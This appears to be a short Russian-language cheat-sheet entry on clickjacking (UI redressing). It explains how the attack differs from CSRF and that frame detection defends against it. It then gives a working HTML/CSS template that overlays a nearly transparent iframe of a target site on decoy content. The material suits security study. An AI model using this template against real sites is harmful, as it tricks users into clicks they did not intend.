# Clickjacking (UI redressing)

Форма прорисовывается поверх формы лигитимного приложения. Разница от CSRF в том, что требуется от пользователя интерактивных действий (кликнуть по кнопке, например).

CSRF токены не защищают от этого вида атак. Защищает детектирование того, что сайт загружен в скрытом iframe.

## Construct basic clickjacking attack

```markup
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```
